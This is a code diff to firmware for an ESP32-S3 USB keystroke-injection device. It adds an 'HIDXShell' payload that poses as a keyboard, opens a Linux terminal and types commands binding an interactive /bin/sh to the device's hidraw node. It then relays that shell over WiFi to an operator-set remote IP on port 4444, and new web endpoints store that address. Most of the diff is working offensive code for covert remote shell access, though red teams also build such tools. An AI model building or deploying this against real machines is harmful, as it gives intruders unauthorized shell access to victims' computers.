@@ -65,6 +65,13 @@ HTTPUpdateServer httpUpdater;
 USBCDC USBSerial;
 USBHIDKeyboard Keyboard;
 
+// HIDX vars
+WiFiClient hidxClient;
+bool hidxEnabled = false;
+bool hidxActive = false;
+String hidxIP = "";
+int hidxPort = 4444;
+
 enum HostOS {
   OS_UNKNOWN,
   OS_WINDOWS,
@@ -950,6 +957,54 @@ void payloadExec() {
     Keyboard.println(Command + 7);
   }
 
+  else if (cmd.startsWith("HIDXShell")) {
+      if (!hidxEnabled) {
+          USBSerial.println("HIDX not configured");
+          return;
+      }
+
+      // Activate HIDX connection
+      hidxActive = true;
+      USBSerial.println("[HIDX] Activation triggered by payload");
+
+      // Get product name from USB config
+      String deviceName = "Espressif_Systems_ESP32S3";
+      if (LittleFS.exists("/usb_config.txt")) {
+          File usbConfig = LittleFS.open("/usb_config.txt", FILE_READ);
+          if (usbConfig) {
+              // Skip vendor and product IDs
+              usbConfig.readStringUntil('\n');
+              usbConfig.readStringUntil('\n');
+              String productName = usbConfig.readStringUntil('\n');
+              productName.trim();
+              if (productName.length() > 0) {
+                  deviceName = productName;
+                  // Escape special characters for grep
+                  deviceName.replace(" ", "\\ ");
+                  deviceName.replace("(", "\\(");
+                  deviceName.replace(")", "\\)");
+              }
+              usbConfig.close();
+          }
+      }
+
+      // Build the command to find correct hidraw device
+      String findCmd = "HIDDEV=$(dmesg | grep -i 'hidraw' | grep -i '" + deviceName + "' | tail -n1 | grep -o 'hidraw[0-9]' | head -n1)";
+
+      // Find HID device
+      Keyboard.press(KEY_LEFT_CTRL);
+      Keyboard.press(KEY_LEFT_ALT);
+      Keyboard.print("t");
+      delay(100);
+      Keyboard.releaseAll();
+      delay(500);
+      Keyboard.println(findCmd);
+      delay(1000);
+      Keyboard.println("/bin/sh -i < /dev/$HIDDEV > /dev/$HIDDEV 2>&1 &");
+      delay(1000);
+      Keyboard.releaseAll();
+  }
+
   else if (cmd.startsWith("ShellWin ")) {
     String connectionString = cmd.substring(9);
     String ip;
@@ -1494,6 +1549,73 @@ void handleDeleteAllPayloads() {
     controlserver.send(200, "application/json", jsonResponse);
 }
 
+void handleHIDXConfig() {
+    if (controlserver.hasArg("hidx_ip") && controlserver.hasArg("hidx_port")) {
+        hidxIP = controlserver.arg("hidx_ip");
+        hidxPort = controlserver.arg("hidx_port").toInt();
+
+        File file = LittleFS.open("/hidx_config.txt", FILE_WRITE);
+        file.println(hidxIP);
+        file.println(hidxPort);
+        file.close();
+
+        hidxEnabled = true;
+        controlserver.send(200, "text/plain", "HIDX Config Saved");
+    }
+}
+
+void handleDeleteHIDXConfig() {
+    if (LittleFS.exists("/hidx_config.txt")) {
+        LittleFS.remove("/hidx_config.txt");
+        hidxEnabled = false;
+        hidxIP = "";
+        hidxPort = 4444;
+        controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"HIDX config deleted\"}");
+    } else {
+        controlserver.send(404, "application/json", "{\"status\":\"error\",\"message\":\"No HIDX config found\"}");
+    }
+}
+
+void handleHIDXShell() {
+    static unsigned long lastReconnectAttempt = 0;
+    const unsigned long reconnectInterval = 5000;
+    static uint8_t hidBuffer[8] = {0};
+    static size_t bytesRead = 0;
+
+    if (!hidxActive) return;
+
+    // Handle connection
+    if (!hidxClient.connected()) {
+        if (millis() - lastReconnectAttempt >= reconnectInterval) {
+            lastReconnectAttempt = millis();
+            if (hidxClient.connect(hidxIP.c_str(), hidxPort)) {
+                USBSerial.println("[HIDX] Connected to server");
+            } else {
+                USBSerial.println("[HIDX] Connection failed");
+            }
+        }
+        return;
+    }
+
+    // Read from USB and send to network
+    while (USBSerial.available() && hidxClient.connected()) {
+        bytesRead = USBSerial.readBytes(hidBuffer, sizeof(hidBuffer));
+        if (bytesRead > 0) {
+            hidxClient.write(hidBuffer, bytesRead);
+            memset(hidBuffer, 0, sizeof(hidBuffer));
+        }
+    }
+
+    // Read from network and send to USB
+    while (hidxClient.available() && hidxClient.connected()) {
+        bytesRead = hidxClient.readBytes(hidBuffer, sizeof(hidBuffer));
+        if (bytesRead > 0) {
+            USBSerial.write(hidBuffer, bytesRead);
+            memset(hidBuffer, 0, sizeof(hidBuffer));
+        }
+    }
+}
+
 void setup() {
   USB.onEvent(usbEventCallback);
   Keyboard.onEvent(usbEventCallback);
@@ -1505,6 +1627,15 @@ void setup() {
     delay(1000);
     ESP.restart();
   }
+
+if (LittleFS.exists("/hidx_config.txt")) {
+    File file = LittleFS.open("/hidx_config.txt", FILE_READ);
+    hidxIP = file.readStringUntil('\n');
+    hidxIP.trim();
+    hidxPort = file.readStringUntil('\n').toInt();
+    file.close();
+    hidxEnabled = true;
+}
 
   if (LittleFS.exists("/usb_config.txt")) {
     File fsUploadFile = LittleFS.open("/usb_config.txt", FILE_READ);
@@ -1861,7 +1992,6 @@ void setup() {
     }
   });
 
-
   controlserver.on("/updatewifi", HTTP_POST, handleUpdateWiFi);
   controlserver.on("/layout", HTTP_POST, handleLayout);
   controlserver.on("/deletewificonfig", HTTP_POST, handleDeleteWiFiConfig);
@@ -1876,6 +2006,8 @@ void setup() {
   controlserver.on("/deletebackupwificonfig", HTTP_POST, handleDeleteBackupWiFiConfig);
   controlserver.on("/updatepayload", HTTP_POST, handleUpdatePayload);
   controlserver.on("/payloadcounter", handlePayloadCounter);
+  controlserver.on("/updatehidx", HTTP_POST, handleHIDXConfig);
+  controlserver.on("/deletehidxconfig", HTTP_POST, handleDeleteHIDXConfig);
 
   httpUpdater.setup(&controlserver);
   controlserver.begin();
@@ -1885,6 +2017,11 @@ void loop() {
   controlserver.handleClient();
   delay(10);
   vTaskDelay(1);
+
+  // Handle HIDX communication if active
+  if (hidxActive) {
+    handleHIDXShell();
+  }
 
   // Check if we should auto-execute a payload
   static bool autoExecChecked = false;
@@ -1974,14 +2111,18 @@ void loop() {
     }
   }
 
-  while (USBSerial.available()) {
-    String data = USBSerial.readString();
-    clientServer.print(data);
+  // Handle existing serial communication only if HIDX is not active
+  if (!hidxActive || !hidxClient.connected()) {
+    while (USBSerial.available()) {
+      String data = USBSerial.readString();
+      clientServer.print(data);
+    }
+    while (clientServer.available()) {
+      String data = clientServer.readString();
+      USBSerial.print(data);
+    }
   }
-  while (clientServer.available()) {
-    String data = clientServer.readString();
-    USBSerial.print(data);
-  }
+
   if (payload_state == 1) {
     // Set layout before executing payload
     setLayoutFromPayload(livepayload);
